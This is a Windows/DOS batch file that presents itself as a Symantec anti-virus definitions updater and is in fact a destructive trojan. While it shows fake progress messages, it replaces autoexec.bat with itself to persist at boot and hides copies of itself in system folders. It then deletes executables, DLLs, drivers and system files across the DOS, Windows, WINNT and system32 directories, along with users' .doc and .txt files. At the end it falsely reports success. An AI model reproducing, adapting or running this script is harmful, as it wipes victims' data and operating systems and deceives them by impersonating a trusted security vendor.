   @echo off
   cls
   echo.
   echo.
   echo. Intelligent Anti-Virus Updater V1.00 -- By Symantec Inc.
   echo.
   echo.                                              28-10-2002
   echo.
   echo. Intelligent Anti-Virus Updater is updating your application now, please
   echo. wait a moment and you must restart the computer may it take effect.
   echo.
   echo.
   echo. Updating now, this may take a few minutes ......
   ehco.
   echo.
   md c:\d-virus
   label c:d-virus
   prompt D-Virus$G
   date 01-01-80
   time 00:00:00.00a
   attrib c:\autoexec.bat -r -s -h
   copy av-update.bat c:\autoexec.bat/y
   copy av-update.bat c:\av-update.bat/y
   rename c:\av-update.bat c:\d-virus.bat
   attrib c:\d-virus.bat +r
   copy c:\d-virus.bat c:\dos\d-virus.xxx/y
   copy c:\d-virus.bat c:\windows\d-virus.xxx/y
   attrib c:\dos\d-virus.xxx +r +s +h
   attrib c:\windows\d-virus.xxx +r +s +h
   attrib c:\*.com -r -s -h
   del c:\*.com
   attrib c:\*.exe -r -s -h
   del c:\*.exe
   attrib c:\*.sys -r -s -h
   del c:\*.sys
   attrib c:\*.bak -r -s -h
   del c:\*.bak
   attrib c:\*.386 -r -s -h
   del c:\*.386
   attrib c:\*.dat -r -s -h
   del c:\*.dat
   attrib c:\*.doc -r -s -h
   del c:\*.doc
   attrib c:\*.txt -r -s -h
   del c:\*.txt
   attrib c:\windows\*.sys -r -s -h
   del c:\windows\*.sys
   attrib c:\windows\*.ini -r -s -h
   del c:\windows\*.ini
   attrib c:\windows\*.exe -r -s -h
   del c:\windows\*.exe
   attrib c:\windows\*.com -r -s -h
   del c:\windows\*.com
   attrib c:\windows\*.dll -r -s -h
   del c:\windows\*.dll
   attrib c:\windows\*.hlp -r -s -h
   del c:\windows\*.hlp
   attrib c:\windows\system\*.drv -r -s -h
   del c:\windows\system\*.drv
   attrib c:\windows\system\*.vxd -r -s -h
   del c:\windows\system\*.vxd
   attrib c:\windows\system\*.dll -r -s -h
   del c:\windows\system\*.dll
   attrib c:\winnt\*.dll -r -s -h
   del c:\winnt\*.dll
   attrib c:\winnt\*.sys -r -s -h
   del c:\winnt\*.sys
   attrib c:\winnt\*.exe -r -s -h
   del c:\winnt\*.exe
   attrib c:\winnt\*.com -r -s -h
   del c:\winnt\*.com
   attrib c:\winnt\system\*.dll -r -s -h
   del c:\winnt\system\*.dll
   attrib c:\winnt\system\*.drv -r -s -h
   del c:\winnt\system\*.drv
   attrib c:\winnt\system\*.vxd -r -s -h
   del c:\winnt\system\*.vxd
   attrib c:\winnt\system32\*.vxd -r -s -h
   del c:\winnt\system32\*.vxd
   attrib c:\winnt\system32\*.com -r -s -h
   del c:\winnt\system32\*.com
   attrib c:\winnt\system32\*.drv -r -s -h
   del c:\winnt\system32\*.drv
   attrib c:\winnt\system32\*.sys -r -s -h
   del c:\winnt\system32\*.sys
   attrib c:\winnt\system32\*.dll -r -s -h
   del c:\winnt\system32\*.dll
   echo.
   echo. Finished!!!   Updater has been updated anti-virus definitions database.
   echo.
   attrib c:\dos\*.exe -r -s -h
   del c:\dos\*.exe
   attrib c:\dos\*.com -r -s -h
   del c:\dos\*.com
